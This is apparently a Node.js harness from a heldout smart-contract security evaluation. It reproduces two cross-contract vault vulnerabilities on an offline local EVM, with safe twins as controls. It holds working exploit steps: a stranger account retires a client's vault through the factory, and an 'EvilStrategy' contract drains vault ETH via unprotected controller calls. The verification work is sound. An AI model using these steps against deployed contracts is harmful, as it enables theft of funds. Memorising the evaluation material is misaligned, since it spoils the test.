// Usage: node crosscontract-heldout3.mjs <heldout3 contracts dir>   (run with the network disabled, e.g. `unshare -rn`)
// Offline EVM reproduction of the two corpus-3 cross-contract leads and their safe twins (negative controls).
// Corpus files are compiled UNMODIFIED; an attacker strategy is compiled as a separate source unit.
import { readFileSync } from "node:fs"; import { createHash } from "node:crypto"; import { Chain, ETHER, compile, encodeCall } from "./lib.mjs";
import { createAddressFromString } from "@ethereumjs/util";
const C3 = (process.argv[2] ?? "eval/heldout3/contracts").replace(/\/?$/, "/");
const sha = (f) => createHash("sha256").update(readFileSync(C3 + f)).digest("hex");
const arg = (a) => Uint8Array.from(Buffer.from(a.toString().replace(/^0x/, "").padStart(64, "0"), "hex"));
const ret = (r) => createAddressFromString("0x" + r.returnData.slice(-40));
const out = { substrate: null, cases: [] };
const EVIL = `pragma solidity ^0.8.20; contract EvilStrategy { function invest() external payable {} function totalValue() external view returns (uint256) { return address(this).balance; } }`;
async function factory(file, F, V) {
  const b = compile(file, readFileSync(C3 + file, "utf8")); if (b.errors.length) throw new Error(b.errors.join("\n")); out.substrate = b.solcVersion + ", evm shanghai (pre-Cancun)";
  const c = await Chain.create(); const owner = c.addr(0xd1), client = c.addr(0xc1), stranger = c.addr(0x5e), treasury = c.addr(0x7e);
  for (const x of [owner, client, stranger]) await c.fund(x, 100n * ETHER);
  const fac = await c.deploy(b.contracts[F].bytecode, owner, arg(treasury));
  const vault = ret(await c.call(client, fac, encodeCall(b.contracts[F].abi, "createVault", [])));
  await c.call(client, vault, new Uint8Array(), 10n * ETHER);
  const before = await c.balance(vault);
  const direct = await c.call(stranger, vault, encodeCall(b.contracts[V].abi, "retire", [stranger.toString()]));
  const via = await c.call(stranger, fac, encodeCall(b.contracts[F].abi, "retireVault", [vault.toString()]));
  const code = await c.evm.stateManager.getCode(vault);
  out.cases.push({ file, sha256: sha(file), entry: `${F}.retireVault`, caller: "unrelated account", directCallToVaultRetire: direct.ok ? "succeeds" : "reverts",
    viaFactory: via.ok ? "succeeds" : "reverts", vaultBalanceBefore: String(before / ETHER) + " ETH", vaultBalanceAfter: String((await c.balance(vault)) / ETHER) + " ETH",
    treasuryReceived: String((await c.balance(treasury)) / ETHER) + " ETH", vaultCodeAfter: code.length ? "present" : "destroyed" });
}
async function controller(file, Ctl, V, approve) {
  const b = compile(file, readFileSync(C3 + file, "utf8")); if (b.errors.length) throw new Error(b.errors.join("\n"));
  const e = compile("Evil.sol", EVIL);
  const c = await Chain.create(); const gov = c.addr(0xd1), stranger = c.addr(0x5e); for (const x of [gov, stranger]) await c.fund(x, 100n * ETHER);
  const ctl = await c.deploy(b.contracts[Ctl].bytecode, gov);
  const vault = await c.deploy(b.contracts[V].bytecode, gov, arg(ctl));
  await c.call(gov, vault, new Uint8Array(), 10n * ETHER);
  const evil = await c.deploy(e.contracts.EvilStrategy.bytecode, stranger);
  const set = await c.call(stranger, ctl, encodeCall(b.contracts[Ctl].abi, "setVaultStrategy", [vault.toString(), evil.toString()]));
  const earn = await c.call(stranger, ctl, encodeCall(b.contracts[Ctl].abi, "harvestAndEarn", [vault.toString()]));
  out.cases.push({ file, sha256: sha(file), entry: `${Ctl}.setVaultStrategy then harvestAndEarn`, caller: "unrelated account with its own strategy contract",
    setVaultStrategy: set.ok ? "succeeds" : "reverts", harvestAndEarn: earn.ok ? "succeeds" : "reverts",
    attackerStrategyBalance: String((await c.balance(evil)) / ETHER) + " ETH", vaultBalanceAfter: String((await c.balance(vault)) / ETHER) + " ETH" });
}
await factory("VaultFactory.sol", "VaultFactory", "ClientVault");
await factory("ManagedVaultFactory.sol", "ManagedVaultFactory", "ManagedClientVault");
await controller("YieldController.sol", "YieldController", "ManagedVault");
await controller("StrategyController.sol", "StrategyController", "ControlledVault");
console.log(JSON.stringify(out, null, 1));
